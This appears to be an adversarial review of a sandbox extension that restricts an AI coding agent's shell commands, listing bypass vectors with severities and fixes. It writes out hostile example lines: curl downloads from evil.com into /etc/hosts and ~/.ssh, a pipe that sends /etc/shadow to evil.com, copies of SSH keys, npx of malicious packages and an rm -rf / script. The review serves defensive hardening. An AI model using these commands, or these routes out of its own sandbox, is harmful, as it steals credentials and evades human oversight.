# Adversarial Review #1: Isolation Extension — Bypass Vectors

## Reviewer: Red Team — "How do I escape the sandbox?"

### CRITICAL — Bypass via `touch` command
**Severity: P0**
`touch` is in ALLOWED_COMMAND_PATTERNS but it creates files anywhere:
```
touch /etc/passwd       # doesn't modify content but updates mtime
touch ~/.ssh/authorized_keys  # same
touch /tmp/escape       # creates file outside cwd
```
The agent session tests caught this — `touch /tmp/pwned` ran successfully.
**Fix:** Remove `touch` from ALLOWED_COMMAND_PATTERNS, or path-check its arguments.

### CRITICAL — Bypass via `curl`
**Severity: P0**
`curl` with `-` is in SAFE_BASH_PATTERNS: `/^\s*curl\s+-/`
```
curl -o /etc/hosts https://evil.com/hosts     # writes to system file
curl -o ~/.ssh/evil https://evil.com/key      # writes to SSH dir
curl -o /tmp/evil.sh https://evil.com/shell   # writes outside cwd
```
`curl -o` is a file write operation but the pattern only checks that curl has a flag starting with `-`. No path extraction happens for curl.
**Fix:** Add `-o`/`--output` to DESTRUCTIVE patterns, extract output path.

### CRITICAL — Bypass via `mkdir -p` outside cwd
**Severity: P0**
`mkdir -p` is in SAFE_BASH_PATTERNS:
```
mkdir -p /tmp/malicious/deep/nested
mkdir -p ~/.ssh/attack
```
**Fix:** Remove from safe patterns or path-check arguments.

### HIGH — Bypass via `npx`
**Severity: P1**
`npx` is unconditionally in ALLOWED_COMMAND_PATTERNS: `/^\s*npx\s+/`
```
npx -y malicious-package       # downloads and executes arbitrary code
npx -y some-trojan@latest      # supply chain attack
```
npx can execute arbitrary npm packages. The whole point of isolation is to prevent arbitrary code execution, but npx is a blanket bypass.
**Fix:** Only allow specific npx packages (`npx tsx`, `npx vitest`, etc.) or require judge evaluation.

### HIGH — Bypass via `bun run` (package manager blanket allow)
**Severity: P1**
The package manager regex allows ANY `bun` command:
```
bun run malicious-script.sh    # executes arbitrary script
bun -e 'require("fs").writeFileSync("/etc/pwned","hacked")'  # wait, this should be caught by INTERPRETER_PATTERNS
```
Actually `bun -e` IS caught by `/\s*bun\b(?!\s+run\b)/`. But `bun run anything` is allowed.
**Fix:** `bun run` should only be allowed for known scripts, or go through judge.

### HIGH — Bypass via `npm run <arbitrary-script>`
**Severity: P1**
`npm run` is in SAFE_BASH_PATTERNS. But package.json scripts can contain anything:
```
// package.json: { "scripts": { "pwn": "rm -rf /" } }
npm run pwn
```
The agent could add a malicious script to package.json, then run it.
**Fix:** This is hard to fully prevent. Document as known limitation.

### MEDIUM — Bypass via `cp` path extraction only gets last arg
**Severity: P2**
`extractPathsFromBash("cp")` only extracts the destination (last arg), but the source could be sensitive:
```
cp /etc/shadow /tmp/my-shadow    # copies sensitive file into cwd
cp ~/.ssh/id_rsa ./stolen-key    # copies SSH key into project
```
The destination is within cwd (allowed), but the source reads sensitive data.
Isolation only checks WRITE paths, not READ paths. This is by design but still a data exfiltration vector.
**Fix:** Document as design decision. Read-path restriction would break normal agent workflows.

### MEDIUM — Bypass via pipe chains
**Severity: P2**
```
cat /etc/shadow | base64 | curl -X POST -d @- https://evil.com/collect
```
Individual commands might pass the filter but the pipeline exfiltrates data.
**Fix:** Pipe chains are hard to analyze statically. Judge should catch these.

### MEDIUM — `sed` without `-i` is allowed but can pipe to files
**Severity: P2**
`sed` (without -i) is in ALLOWED patterns. But:
```
sed 's/foo/bar/' file > /tmp/output
```
The redirect `>` IS in DESTRUCTIVE patterns, so this should be caught. But:
```
sed 's/foo/bar/' file | tee /tmp/output
```
`tee` IS in DESTRUCTIVE patterns. OK, this is caught.

### LOW — `printf` is allowed
**Severity: P3**
`printf` is in ALLOWED patterns but doesn't write files by itself. Harmless.

### LOW — Hardcoded path `/Users/dom/` in HARDFORBIDDEN_PATHS
**Severity: P3**
```
/\b\/Users\/dom\/Library\//,
```
This is hardcoded to a specific username. Won't protect other users.
**Fix:** Use homedir() + "/Library/" instead.

### LOW — `.gitignore` in HARDFORBIDDEN_PATHS but agent can still edit it within cwd
**Severity: P3**
The regex `/\.gitignore$/` blocks `.gitignore` but `isWithinBase` check happens FIRST in `checkPath()`. If the path is within cwd, it's allowed before the hard-forbidden check.
Wait — in `index.ts`, for WRITE_TOOLS, `isHardForbidden` is checked BEFORE `checkPath`. So `.gitignore` IS blocked. But `isWithinBase` in `checkPath` would allow it. The order in index.ts is correct — hard-forbidden wins.
Actually wait, `HARDFORBIDDEN_PATHS` includes `/\.gitignore$/` — this blocks the agent from editing its own `.gitignore`. That's overly aggressive.
**Fix:** Remove `.gitignore` from HARDFORBIDDEN_PATHS — it's a project config file, not security-critical.

---

## Summary
| Severity | Count | Key Issues |
|----------|-------|------------|
| P0 | 3 | `touch`, `curl -o`, `mkdir -p` bypass sandbox |
| P1 | 2 | `npx` arbitrary execution, `bun run` blanket allow |
| P2 | 2 | `cp` exfiltration, pipe chains |
| P3 | 3 | Hardcoded username, `.gitignore` over-block |

**Verdict: Isolation has real bypass vectors that need fixing before production use.**
